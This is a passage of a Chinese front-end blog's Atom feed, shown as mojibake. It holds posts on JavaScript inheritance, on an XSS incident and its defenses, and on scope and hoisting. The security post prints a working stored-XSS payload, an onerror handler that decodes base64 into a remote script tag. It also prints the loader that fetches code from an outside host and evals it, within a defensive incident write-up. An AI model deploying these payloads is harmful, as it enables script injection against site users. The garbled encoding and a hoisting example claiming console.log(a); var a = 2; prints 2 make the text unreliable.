&lt;p&gt;ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯JavaScriptçš„&lt;strong&gt;ç»§æ‰¿&lt;/strong&gt;,ä¸Javaçš„ç»§æ‰¿å®é™…ä¸Šæœ‰å¾ˆå¤§çš„åŒºåˆ«ï¼Œåœ¨Javaè¯­è¨€ä¸­ï¼Œ&lt;strong&gt;ç»§æ‰¿&lt;/strong&gt;æ˜¯ä¸€ä¸ª&lt;strong&gt;æ‹·è´è¿‡ç¨‹&lt;/strong&gt;åœ¨ç‰©ç†åœ°å€ä¸Šå‘ç”Ÿäº†æ‹·è´ï¼Œè€ŒJavaScriptè¯­è¨€æ˜¯é€šè¿‡&lt;strong&gt;åŸå‹é“¾&lt;/strong&gt;å°†å…¶â€é“¾æ¥â€åœ¨ä¸€èµ·ï¼Œæ²¡æœ‰å‘ç”Ÿå®é™…çš„æ‹·è´ã€‚&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>å‰ç«¯å®‰å…¨ä¸é˜²èŒƒ</title>
    <link href="http://zhoushaw.github.io/2019/04/16/learning/font-end/security/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E8%8C%83/"/>
    <id>http://zhoushaw.github.io/2019/04/16/learning/font-end/security/å‰ç«¯å®‰å…¨ä¸é˜²èŒƒ/</id>
    <published>2019-04-16T01:36:35.000Z</published>
    <updated>2019-04-20T12:39:57.663Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»Šå¤©ä¸»ç«™é­å—äº†xssæ”»å‡»ï¼Œèµ·å› æ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·å‘è¡¨äº†ä¸€ä¸ªç©¿æ­ï¼Œåç«¯æ¥æ”¶åˆ°å¼‚å¸¸è­¦æŠ¥æ’æŸ¥åå‘ç°ç”¨æˆ·çš„ç©¿æ­çš„<strong>æè¿°</strong>ä¸­å¸¦æœ‰:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;body/hidden&gt;&lt;img src=x onerror=document[&apos;write&apos;](atob(&apos;PGJvZHkvaGlkZGVuPjxzY3JpcHQgc3JjPWh0dHBzOi8vczUubW9ndWNkbi5jb20vbWxjZG4vYzQ1NDA2LzE5MDQxNV82M2o2NWxlazRkMjJnODZjNWhiN2thOThsOWZmZT48L3NjcmlwdD4=&apos;))&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>å› ä¸ºç©¿æ­lookä¸­å¸¦æœ‰æ ¼å¼åŒ–åhtmlçš„æè¿°å†…å®¹ï¼Œæ‰€ä»¥ç›´æ¥é€šè¿‡<strong>v-html</strong>æŒ‡ä»¤è¾“å‡ºäº†æè¿°å†…å®¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div v-if=&quot;from === &apos;detail&apos;&quot; v-html=&quot;content&quot; ref=&quot;content&quot; style=&quot;-webkit-user-select: text&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™æ”»å‡»çš„htmlæ ‡ç­¾å°†ä¼šç›´æ¥è¢«æ³¨å…¥åˆ°é¡µé¢ä¸­ï¼Œè¿™é‡Œè¿˜æ¶‰åŠåˆ°å¦å¤–ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š</p><ul><li>btoaï¼ˆbase64åŠ å¯†ï¼‰</li><li>atob ï¼ˆbase64è§£å¯†ï¼‰</li></ul><div><a id="more"></a></div><p>ç»è¿‡<code>atob</code>è§£å¯†åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">atob(&apos;PGJvZHkvaGlkZGVuPjxzY3JpcHQgc3JjPWh0dHBzOi8vczUubW9ndWNkbi5jb20vbWxjZG4vYzQ1NDA2LzE5MDQxNV82M2o2NWxlazRkMjJnODZjNWhiN2thOThsOWZmZT48L3NjcmlwdD4=&apos;)</span><br><span class="line"></span><br><span class="line">// è½¬å˜æˆ</span><br><span class="line"></span><br><span class="line">&lt;body/hidden&gt;&lt;script src=https://s5.mogucdn.com/mlcdn/c45406/190415_63j65lek4d22g86c5hb7ka98l9ffe&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">// ä¸€èˆ¬æ”»å‡»è€…éƒ½ä¸ä¼šå°†ï¼Œbodyéšè—ã€‚è€Œæ˜¯ç›´æ¥é€šè¿‡ç›—ç”¨ä¿¡æ¯</span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>document[&#39;write&#39;]</code>å°†domå†™å…¥é¡µé¢åï¼Œé€šè¿‡<code>mogucdn</code>èµ„æºå°†ä¼šä¸‹è½½è„šæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var ua = navigator.userAgent.toLowerCase();</span><br><span class="line"></span><br><span class="line">// åœ¨å¾®ä¿¡ç¯å¢ƒä¸‹ï¼Œå°†ä¼šé€šè¿‡ajaxè¯·æ±‚è·å–ç«™å¤–è„šæœ¬ï¼Œè·å–å®Œæˆåé€šè¿‡evalåŠ¨æ€æ‰§è¡Œ</span><br><span class="line">if (/micromessenger/.test(ua)) &#123;</span><br><span class="line">    $.get(&apos;https://api.ruanwin.com/j&apos;,function(d) &#123;</span><br><span class="line">        window[&apos;ev&apos; + &apos;al&apos;](d);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ‰€å¹¸ç²¾é€‰ç©¿æ­å¿…é¡»ç”±äº§å“æ‰‹åŠ¨å®¡æ ¸ï¼Œè¯¥lookå¹¶ä¸ä¼šè¿›å…¥é¦–é¡µï¼Œå¦åˆ™è‡³å°‘å°†é€ æˆP1çº§æ•…éšœ</strong></p><h2 id="å®‰å…¨äºé˜²èŒƒ"><a href="#å®‰å…¨äºé˜²èŒƒ" class="headerlink" title="å®‰å…¨äºé˜²èŒƒ"></a>å®‰å…¨äºé˜²èŒƒ</h2><blockquote><p>å¸¸è§æ”»å‡»æ‰‹æ®µ</p></blockquote><ul><li><p>XSS</p><ul><li>è·¨ç«™è„šæœ¬ï¼ˆCross-site scriptingï¼Œé€šå¸¸ç®€ç§°ä¸ºXSSï¼‰æ˜¯ä¸€ç§ç½‘ç«™åº”ç”¨ç¨‹åºçš„å®‰å…¨æ¼æ´æ”»å‡»ï¼Œæ˜¯ä»£ç æ³¨å…¥çš„ä¸€ç§ã€‚å®ƒå…è®¸æ¶æ„ç”¨æˆ·å°†ä»£ç æ³¨å…¥åˆ°ç½‘é¡µä¸Šï¼Œå…¶ä»–ç”¨æˆ·åœ¨è§‚çœ‹ç½‘é¡µæ—¶å°±ä¼šå—åˆ°å½±å“ã€‚è¿™ç±»æ”»å‡»é€šå¸¸åŒ…å«äº†HTMLä»¥åŠç”¨æˆ·ç«¯è„šæœ¬è¯­è¨€ã€‚</li></ul></li><li><p>CSRF</p><ul><li>è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆè‹±è¯­ï¼šCross-site request forgeryï¼‰ï¼Œä¹Ÿè¢«ç§°ä¸º one-click attack æˆ–è€… session ridingï¼Œé€šå¸¸ç¼©å†™ä¸º CSRF æˆ–è€… XSRFï¼Œ æ˜¯ä¸€ç§æŒŸåˆ¶ç”¨æˆ·åœ¨å½“å‰å·²ç™»å½•çš„Webåº”ç”¨ç¨‹åºä¸Šæ‰§è¡Œéæœ¬æ„çš„æ“ä½œçš„æ”»å‡»æ–¹æ³•ã€‚</li></ul></li></ul><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><blockquote><p>XSSé˜²èŒƒ</p></blockquote><p>åœ¨å‰è¨€ä¸­çš„æ¡ˆä¾‹ï¼Œå°±æ˜¯<code>XSS</code>æ”»å‡»çš„å…¸èŒƒã€‚æˆ‘ä»¬å¦‚ä½•é¿å…è¢«<code>XSS</code>æ”»å‡»å‘¢ï¼Œå¯ä»¥ä»ä»¥ä¸‹å‡ æ–¹é¢å…¥æ‰‹ï¼š</p><ul><li>è¾“å…¥è¿‡æ»¤<ul><li><blockquote><p>ç¬¦å·è½¬è¯‘æˆ<code>&amp;lt;</code>ç­‰ç¬¦å·</p></blockquote></li></ul></li><li>å†…å®¹è¾“å‡º<ul><li>å«æœ‰<code>html</code>è¾“å‡ºå†…å®¹ï¼Œå¯¹ HTML åšå®‰å…¨è¿‡æ»¤ã€‚ä¸‹æ–‡å°†è¯¦ç»†ä»‹ç»å¦‚æœè¿›è¡Œå®‰å…¨è¿‡æ»¤è®¾è®¡</li><li>ç¦æ­¢ä½¿ç”¨ï¼š<code>.innerHTML</code>ã€<code>.outerHTML</code>ã€<code>document.write()</code></li><li><strong>Vue</strong>/<strong>React</strong> æŠ€æœ¯æ ˆï¼Œå¹¶ä¸”ä¸ä½¿ç”¨ <code>v-html</code>/<code>dangerouslySetInnerHTML</code></li><li>è¿‡æ»¤åº“<a href="https://github.com/leizongmin/js-xss" target="_blank" rel="noopener">js-xss</a></li></ul></li><li>ä½¿ç”¨CSPï¼Œé™åˆ¶éç™½åå•è„šæœ¬åŠ è½½<ul><li>httpè¯·æ±‚å¤´æ·»åŠ ï¼šContent-Security-Policy</li><li>å‚è€ƒï¼š<a href="http://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener">cspé˜²èŒƒæ·»åŠ </a></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;ä»Šå¤©ä¸»ç«™é­å—äº†xssæ”»å‡»ï¼Œèµ·å› æ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·å‘è¡¨äº†ä¸€ä¸ªç©¿æ­ï¼Œåç«¯æ¥æ”¶åˆ°å¼‚å¸¸è­¦æŠ¥æ’æŸ¥åå‘ç°ç”¨æˆ·çš„ç©¿æ­çš„&lt;strong&gt;æè¿°&lt;/strong&gt;ä¸­å¸¦æœ‰:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;p&amp;gt;&amp;lt;body/hidden&amp;gt;&amp;lt;img src=x onerror=document[&amp;apos;write&amp;apos;](atob(&amp;apos;PGJvZHkvaGlkZGVuPjxzY3JpcHQgc3JjPWh0dHBzOi8vczUubW9ndWNkbi5jb20vbWxjZG4vYzQ1NDA2LzE5MDQxNV82M2o2NWxlazRkMjJnODZjNWhiN2thOThsOWZmZT48L3NjcmlwdD4=&amp;apos;))&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å› ä¸ºç©¿æ­lookä¸­å¸¦æœ‰æ ¼å¼åŒ–åhtmlçš„æè¿°å†…å®¹ï¼Œæ‰€ä»¥ç›´æ¥é€šè¿‡&lt;strong&gt;v-html&lt;/strong&gt;æŒ‡ä»¤è¾“å‡ºäº†æè¿°å†…å®¹ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;div v-if=&amp;quot;from === &amp;apos;detail&amp;apos;&amp;quot; v-html=&amp;quot;content&amp;quot; ref=&amp;quot;content&amp;quot; style=&amp;quot;-webkit-user-select: text&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;è¿™ä¸ªæ—¶å€™æ”»å‡»çš„htmlæ ‡ç­¾å°†ä¼šç›´æ¥è¢«æ³¨å…¥åˆ°é¡µé¢ä¸­ï¼Œè¿™é‡Œè¿˜æ¶‰åŠåˆ°å¦å¤–ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;btoaï¼ˆbase64åŠ å¯†ï¼‰&lt;/li&gt;
&lt;li&gt;atob ï¼ˆbase64è§£å¯†ï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="security" scheme="http://zhoushaw.github.io/categories/security/"/>
    
    
      <category term="security" scheme="http://zhoushaw.github.io/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>scope &amp; closures</title>
    <link href="http://zhoushaw.github.io/2019/04/05/learning/book-notes/scope&amp;closures/"/>
    <id>http://zhoushaw.github.io/2019/04/05/learning/book-notes/scope&amp;closures/</id>
    <published>2019-04-04T20:36:35.000Z</published>
    <updated>2019-04-20T12:39:57.661Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‚è€ƒæ¥æº"><a href="#å‚è€ƒæ¥æº" class="headerlink" title="å‚è€ƒæ¥æº"></a>å‚è€ƒæ¥æº</h2><p>æœ¬æ–‡æ˜¯you donâ€™t know jsç³»åˆ—çš„ <a href="https://github.com/getify/You-Dont-Know-JS/tree/1ed-zh-CN/scope%20%26%20closures" target="_blank" rel="noopener">ä½œç”¨åŸŸä¸é—­åŒ…</a> ç¬”è®°</p><h2 id="ä¸€ã€ä½œç”¨åŸŸ"><a href="#ä¸€ã€ä½œç”¨åŸŸ" class="headerlink" title="ä¸€ã€ä½œç”¨åŸŸ"></a>ä¸€ã€ä½œç”¨åŸŸ</h2><h3 id="ä»€ä¹ˆæ˜¯ä½œç”¨åŸŸ"><a href="#ä»€ä¹ˆæ˜¯ä½œç”¨åŸŸ" class="headerlink" title="ä»€ä¹ˆæ˜¯ä½œç”¨åŸŸ"></a>ä»€ä¹ˆæ˜¯ä½œç”¨åŸŸ</h3><p>å‡ ä¹æ‰€æœ‰è®¡ç®—æœºè¯­è¨€éƒ½æä¾›äº†æœ€åŸºç¡€çš„å˜é‡æ¨¡å‹ï¼Œå˜é‡å®ƒå…è®¸äººä»¬å°†å€¼å­˜å…¥å˜é‡ä¸­ï¼Œå¹¶ä¸”å†åç»­ä»å˜é‡ä¸­å–å€¼æˆ–ä¿®æ”¹å€¼ã€‚</p><p>ä½†æ˜¯å˜é‡çš„å­˜å‚¨åŒæ ·ä¼šå¸¦æ¥å‡ ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¦‚ä½•å­˜å‚¨æ•°æ®åˆ°å˜é‡ä¸Šï¼Œåˆå¦‚ä½•æŸ¥æ‰¾å˜é‡çš„å€¼ã€‚è¿™æ ·çš„ä¸€äº›åˆ—è§„åˆ™æˆ‘ä»¬å°†å…¶ç§°ä¹‹ä¸ºä½œç”¨åŸŸ</p><p><div><a id="more"></a></div></p><h3 id="ç†è§£ä½œç”¨åŸŸ"><a href="#ç†è§£ä½œç”¨åŸŸ" class="headerlink" title="ç†è§£ä½œç”¨åŸŸ"></a>ç†è§£ä½œç”¨åŸŸ</h3><p>å¦‚ä½•æ­£ç¡®çš„ç†è§£ä½œç”¨åŸŸå‘¢ï¼Œä¸ºäº†æ–¹ä¾¿ç†è§£å¯ä»¥ç®€å•çš„å°†JavaScriptç¨‹åºè¿è¡Œæ—¶åˆ†æˆä¸‰å¤§éƒ¨åˆ†ï¼š</p><ul><li>å¼•æ“ï¼šè´Ÿè´£ä»å§‹è‡³ç»ˆçš„ç¼–è¯‘å’Œæ‰§è¡Œæˆ‘ä»¬çš„ JavaScript ç¨‹åºã€‚</li><li>ç¼–è¯‘å™¨ï¼šå¼•æ“ çš„æœ‹å‹ä¹‹ä¸€ï¼›å¤„ç†æ‰€æœ‰çš„è§£æå’Œä»£ç ç”Ÿæˆçš„é‡æ´»å„¿</li><li>ä½œç”¨åŸŸï¼šå¼•æ“ çš„å¦ä¸€ä¸ªæœ‹å‹ï¼›æ”¶é›†å¹¶ç»´æŠ¤ä¸€å¼ æ‰€æœ‰è¢«å£°æ˜çš„æ ‡è¯†ç¬¦ï¼ˆå˜é‡ï¼‰çš„åˆ—è¡¨ï¼Œå¹¶å¯¹å½“å‰æ‰§è¡Œä¸­çš„ä»£ç å¦‚ä½•è®¿é—®è¿™äº›å˜é‡å¼ºåˆ¶å®æ–½ä¸€ç»„ä¸¥æ ¼çš„è§„åˆ™ã€‚</li></ul><p>è®©æˆ‘ä»¬æ¥åˆ†æå¼•æ“æ˜¯å¦‚ä½•å¤„ç†<code>var a = 2;</code>è¿™æ ·çš„ä¸€ä¸ªè¯­å¥çš„å§ï¼Œé¦–å…ˆä¸€ä¸ªåˆç†çš„å‡è®¾æ˜¯ï¼šä¸ºä¸€ä¸ªå˜é‡åˆ†é…ä¸€ä¸ªå†…å­˜ï¼Œå¹¶å°†å…¶æ ‡è®°æˆaã€‚ç„¶åå°†2èµ‹å€¼åˆ°å˜é‡aä¸­ã€‚ä¸å¹¸çš„æ˜¯ï¼Œè¿™å¹¶ä¸æ˜¯ååˆ†ç²¾å‡†çš„</p><p>ç¼–è¯‘å™¨ä¼šè¿™æ ·å¤„ç†ï¼š</p><ul><li>ç¼–è¯‘å™¨é¦–å…ˆä¼šè¿›è¡Œè¯æ³•åˆ†æï¼Œå°†<code>var a = 2;</code>å­—ç¬¦ä¸²æ‰“æ–­æˆæœ‰æ„ä¹‰çš„ç‰‡æ®µä¹Ÿç§°ä¹‹ä¸ºtokenï¼Œè¿™æ®µç¨‹åºæœ‰å¯èƒ½ä¼šè¢«æ‰“æ–­æˆ<code>var</code>ã€<code>a</code>ã€<code>=</code>ã€<code>2</code>å’Œ<code>=</code></li><li>å°†ä¸€ä¸ª token çš„æµï¼ˆæ•°ç»„ï¼‰è½¬æ¢ä¸ºä¸€ä¸ªåµŒå¥—å…ƒç´ çš„æ ‘ï¼Œå®ƒç»¼åˆåœ°è¡¨ç¤ºäº†ç¨‹åºçš„è¯­æ³•ç»“æ„ã€‚</li><li>è¯æ³•åˆ†æå’ŒAST(æŠ½è±¡è¯­æ³•æ ‘)è½¬æ¢å®Œæˆåï¼Œé‡åˆ°<code>var a</code>ï¼Œç¼–è¯‘å™¨ä¼šè®©ä½œç”¨åŸŸæŸ¥çœ‹æ˜¯å¦å­˜åœ¨å½“å‰è¿™ä¸ªç‰¹å®šçš„ä½œç”¨åŸŸé›†åˆï¼Œå˜é‡ <code>a</code> æ˜¯å¦å·²ç»å­˜åœ¨äº†ã€‚å¦‚æœæ˜¯ï¼Œç¼–è¯‘å™¨ å°±å¿½ç•¥è¿™ä¸ªå£°æ˜å¹¶ç»§ç»­å‰è¿›ã€‚å¦åˆ™ï¼Œç¼–è¯‘å™¨ å°±è®© ä½œç”¨åŸŸ å»ä¸ºè¿™ä¸ªä½œç”¨åŸŸé›†åˆå£°æ˜ä¸€ä¸ªç§°ä¸º a çš„æ–°å˜é‡ã€‚</li><li>ç„¶å ç¼–è¯‘å™¨ ä¸º å¼•æ“ ç”Ÿæˆç¨åè¦æ‰§è¡Œçš„ä»£ç ï¼Œæ¥å¤„ç†èµ‹å€¼ a = 2ã€‚å¼•æ“ è¿è¡Œçš„ä»£ç é¦–å…ˆè®© ä½œç”¨åŸŸ å»æŸ¥çœ‹åœ¨å½“å‰çš„ä½œç”¨åŸŸé›†åˆä¸­æ˜¯å¦æœ‰ä¸€ä¸ªç§°ä¸º a çš„å˜é‡å¯ä»¥è®¿é—®ã€‚å¦‚æœæœ‰ï¼Œå¼•æ“ å°±ä½¿ç”¨è¿™ä¸ªå˜é‡ã€‚å¦‚æœæ²¡æœ‰ï¼Œå¼•æ“ å°±æŸ¥çœ‹ å…¶ä»–åœ°æ–¹</li></ul><blockquote><p>ç¼–è¯‘å™¨æœ¯è¯­</p></blockquote><p>åœ¨æˆ‘ä»¬è¿™ä¸ªä¾‹å­ä¸­ï¼Œå¼•æ“ å°†ä¼šå¯¹å˜é‡ <code>a</code> å®æ–½ä¸€ä¸ªâ€œLHSâ€æŸ¥è¯¢ã€‚å¦ä¸€ç§ç±»å‹çš„æŸ¥è¯¢ç§°ä¸ºâ€œRHSâ€ã€‚</p><p>æ¢è¨€ä¹‹ï¼Œå½“ä¸€ä¸ªå˜é‡å‡ºç°åœ¨èµ‹å€¼æ“ä½œçš„å·¦æ‰‹è¾¹æ—¶ï¼Œä¼šè¿›è¡Œ LHS æŸ¥è¯¢ï¼Œå½“ä¸€ä¸ªå˜é‡å‡ºç°åœ¨èµ‹å€¼æ“ä½œçš„å³æ‰‹è¾¹æ—¶ï¼Œä¼šè¿›è¡Œ RHS æŸ¥è¯¢ã€‚<br>å¯ä»¥è®¤ä¸ºLHS æŸ¥è¯¢æ˜¯è¯•ç€æ‰¾åˆ°å˜é‡å®¹å™¨æœ¬èº«ï¼Œä»¥ä¾¿å®ƒå¯ä»¥èµ‹å€¼,â€œRHSâ€æ„å‘³ç€â€œå–å¾—ä»–/å¥¹çš„æºï¼ˆå€¼ï¼‰â€ï¼Œæš—ç¤ºç€ RHS çš„æ„æ€æ˜¯â€œå»å–â€¦â€¦çš„å€¼<br>åœ¨æ¦‚å¿µä¸Šå°†å®ƒè€ƒè™‘ä¸ºï¼šâ€œèµ‹å€¼çš„ç›®æ ‡ï¼ˆLHSï¼‰â€å’Œâ€œèµ‹å€¼çš„æºï¼ˆRHSï¼‰â€</p><h3 id="åµŒå¥—çš„ä½œç”¨åŸŸ"><a href="#åµŒå¥—çš„ä½œç”¨åŸŸ" class="headerlink" title="åµŒå¥—çš„ä½œç”¨åŸŸ"></a>åµŒå¥—çš„ä½œç”¨åŸŸ</h3><p>æˆ‘ä»¬è¯´è¿‡ ä½œç”¨åŸŸ æ˜¯é€šè¿‡æ ‡è¯†ç¬¦åç§°æŸ¥è¯¢å˜é‡çš„ä¸€ç»„è§„åˆ™ã€‚ä½†æ˜¯ï¼Œé€šå¸¸ä¼šæœ‰å¤šäºä¸€ä¸ªçš„ ä½œç”¨åŸŸ éœ€è¦è€ƒè™‘ã€‚</p><p>å°±åƒä¸€ä¸ªä»£ç å—å„¿æˆ–å‡½æ•°è¢«åµŒå¥—åœ¨å¦ä¸€ä¸ªä»£ç å—å„¿æˆ–å‡½æ•°ä¸­ä¸€æ ·ï¼Œä½œç”¨åŸŸè¢«åµŒå¥—åœ¨å…¶ä»–çš„ä½œç”¨åŸŸä¸­ã€‚æ‰€ä»¥ï¼Œå¦‚æœåœ¨ç›´æ¥ä½œç”¨åŸŸä¸­æ‰¾ä¸åˆ°ä¸€ä¸ªå˜é‡çš„è¯ï¼Œå¼•æ“ å°±ä¼šå’¨è¯¢ä¸‹ä¸€ä¸ªå¤–å±‚ä½œç”¨åŸŸï¼Œå¦‚æ­¤ç»§ç»­ç›´åˆ°æ‰¾åˆ°è¿™ä¸ªå˜é‡æˆ–è€…åˆ°è¾¾æœ€å¤–å±‚ä½œç”¨åŸŸï¼ˆä¹Ÿå°±æ˜¯å…¨å±€ä½œç”¨åŸŸï¼‰ã€‚</p><h3 id="å˜é‡æå‡"><a href="#å˜é‡æå‡" class="headerlink" title="å˜é‡æå‡"></a>å˜é‡æå‡</h3><p>æœ‰ä¸€ç§å€¾å‘è®¤ä¸ºä½ åœ¨ JavaScript ç¨‹åºä¸­çœ‹åˆ°çš„æ‰€æœ‰ä»£ç ï¼Œåœ¨ç¨‹åºæ‰§è¡Œçš„è¿‡ç¨‹ä¸­éƒ½æ˜¯ä»ä¸Šåˆ°ä¸‹ä¸€è¡Œä¸€è¡Œåœ°è¢«è§£é‡Šæ‰§è¡Œçš„ã€‚è™½ç„¶è¿™å¤§è‡´ä¸Šæ˜¯å¯¹çš„ï¼Œä½†æ˜¯è¿™ç§çŒœæµ‹ä¸­çš„ä¸€ä¸ªéƒ¨åˆ†å¯èƒ½ä¼šå¯¼è‡´ä½ é”™è¯¯åœ°è€ƒè™‘ä½ çš„ç¨‹åºã€‚</p><p class="tip">åœ¨ä½œç”¨åŸŸçš„è§„åˆ™ä¸­ï¼Œå­˜åœ¨â€œå˜é‡æå‡â€è¿™ä¹ˆä¸€ä¸ªæ¦‚å¿µã€‚ä¸è¿‡ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªæ¦‚å¿µå¯èƒ½äº§ç”Ÿä¸€ç‚¹ç‚¹è¯¯è§£ ã€‚ä¾‹å¦‚ï¼Œä»æ¦‚å¿µçš„å­—é¢æ„ä¹‰ä¸Šè¯´ï¼Œâ€œå˜é‡æå‡â€æ„å‘³ç€å˜é‡å’Œå‡½æ•°çš„å£°æ˜ä¼šåœ¨ç‰©ç†å±‚é¢ç§»åŠ¨åˆ°ä»£ç çš„æœ€å‰é¢ï¼Œä½†è¿™ä¹ˆè¯´å¹¶ä¸å‡†ç¡®ã€‚å®é™…ä¸Šå˜é‡å’Œå‡½æ•°å£°æ˜åœ¨ä»£ç é‡Œçš„ä½ç½®æ˜¯ä¸ä¼šåŠ¨çš„ï¼Œè€Œæ˜¯åœ¨ç¼–è¯‘é˜¶æ®µè¢«æ”¾å…¥å†…å­˜ä¸­ã€‚</p><blockquote><p>è€ƒè™‘å¦ä¸€ä¸ªä»£ç æ®µï¼š</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>è®¸å¤šå¼€å‘è€…ä¼šæœŸæœ› undefinedï¼Œå› ä¸ºè¯­å¥ var a å‡ºç°åœ¨ a = 2 ä¹‹åï¼Œè¿™å¾ˆè‡ªç„¶åœ°çœ‹èµ·æ¥åƒæ˜¯è¿™ä¸ªå˜é‡è¢«é‡å®šä¹‰äº†ï¼Œå¹¶å› æ­¤è¢«èµ‹äºˆäº†é»˜è®¤çš„ undefinedã€‚ç„¶è€Œï¼Œè¾“å‡ºå°†æ˜¯ 2ã€‚</p><blockquote><p>è€ƒè™‘å¦ä¸€ä¸ªä»£ç æ®µï¼š</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>ä½ å¯èƒ½ä¼šè¢«è¯±å¯¼è€Œè¿™æ ·è®¤ä¸ºï¼šå› ä¸ºä¸Šä¸€ä¸ªä»£ç æ®µå±•ç¤ºäº†ä¸€ç§çœ‹èµ·æ¥ä¸æ˜¯ä»ä¸Šåˆ°ä¸‹çš„è¡Œä¸ºï¼Œä¹Ÿè®¸åœ¨è¿™ä¸ªä»£ç æ®µä¸­ï¼Œä¹Ÿä¼šæ‰“å° 2ã€‚å¦ä¸€äº›äººè®¤ä¸ºï¼Œå› ä¸ºå˜é‡ a åœ¨å®ƒè¢«å£°æ˜ä¹‹å‰å°±è¢«ä½¿ç”¨äº†ï¼Œæ‰€ä»¥è¿™ä¸€å®šä¼šå¯¼è‡´ä¸€ä¸ª ReferenceError è¢«æŠ›å‡ºã€‚</p><p>ä¸å¹¸çš„æ˜¯ï¼Œä¸¤ç§çŒœæµ‹éƒ½ä¸æ­£ç¡®ã€‚è¾“å‡ºæ˜¯ undefinedã€‚</p><h4 id="ç¼–è¯‘å™¨å†æ¬¡è¢­æ¥"><a href="#ç¼–è¯‘å™¨å†æ¬¡è¢­æ¥" class="headerlink" title="ç¼–è¯‘å™¨å†æ¬¡è¢­æ¥"></a>ç¼–è¯‘å™¨å†æ¬¡è¢­æ¥</h4><p>å¼•æ“ å®é™…ä¸Šå°†ä¼šåœ¨å®ƒè§£é‡Šæ‰§è¡Œä½ çš„ JavaScript ä»£ç ä¹‹å‰ç¼–è¯‘å®ƒã€‚ç¼–è¯‘è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†å°±æ˜¯æ‰¾åˆ°æ‰€æœ‰çš„å£°æ˜ï¼Œå¹¶å°†å®ƒä»¬å…³è”åœ¨åˆé€‚çš„ä½œç”¨åŸŸä¸Šã€‚</p><p>æ‰€ä»¥ï¼Œè€ƒè™‘è¿™ä»¶äº‹æƒ…çš„æœ€ä½³æ–¹å¼æ˜¯ï¼Œåœ¨ä½ çš„ä»£ç 